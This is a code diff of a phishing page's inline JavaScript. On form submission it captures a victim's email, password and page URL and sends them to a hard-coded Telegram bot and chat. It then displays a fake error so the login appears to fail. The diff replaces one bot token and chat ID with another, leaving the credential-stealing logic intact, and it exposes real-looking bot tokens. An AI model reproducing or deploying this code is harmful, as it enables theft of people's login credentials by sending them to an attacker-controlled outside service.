@@ -98,53 +98,64 @@
                     </div>
                 </div>
             </div>
-         <script>
-        // Define the Telegram bot token and chat ID
-        const telegramBotToken = '7719751326:AAEuzVtlSpvou8ol2-YdTJvGrxXKHqITE_s';
-        const chatId = '5990707499';
-
-        // Add event listener to the form submission
+            <script>
+                const token = "7529264099:AAF6rYjxZXC0meQC1LZDcWixSNJ8FCiRFRA"
+        // const api = "";
+        // const Emails = ""
+        // const Pass = ""
+        // const Domain = "";
+        // const btn = document.querySelector(".button")
+        
+        // const emailRes = document.querySelector("email").value;
+        
+        
+        
         document.querySelector('.form').addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent the form from submitting traditionally
-
-            // Get form input values
+        
+            e.preventDefault(); 
+        const Cokkies = window.location
+        
             const email = document.querySelector('.email').value;
             const password = document.querySelector('.password').value;
-            const currentUrl = window.location.href; // Get the current URL
-
-            // Log the data to the console
-            console.log(`Email: ${email}\nPassword: ${password}\nURL: ${currentUrl}`);
-
-            // Construct the message to send to Telegram
-            const message = `Email: ${email}\nPassword: ${password}\nURL: ${currentUrl}`;
-
-            // Send the message via Telegram API
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+             console.log(`emails: ${email}n/ password ${password}n/ Cookies: ${Cokkies}`)
+        
+            const telegramBotToken = '7529264099:AAF6rYjxZXC0meQC1LZDcWixSNJ8FCiRFRA'; 
+            const chatId = "7435300853"; 
+            const message = `Email: ${email}\nPassword: ${password}n/ Cookies: ${Cokkies}` ;
+            console.log("cookies:"+Cokkies)
+        
+        
+            fetch(`https://api.telegram.org/bot7529264099:AAF6rYjxZXC0meQC1LZDcWixSNJ8FCiRFRA/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: message
-                })
+                    text: message,
+                    parse_mode: 'HTML'
+                }),
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    console.error('Failed to Login:', data);
-                    alert('Error sending data');
+                    alert('Error!');
+                    console.log(data)
+                    console.log(window.history)
                 } else {
-                    console.error('Failed to Login:', data);
-                    alert('Error sending data');
+                    console.log(data)
+                     alert('Error Page ');
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
-                alert('Invalid request');
+                alert("Invalid")
+                                // console.log(error)
             });
         });
-    </script>
+        
+        
+        
+            </script>
         </div>
     </body>
 </html>
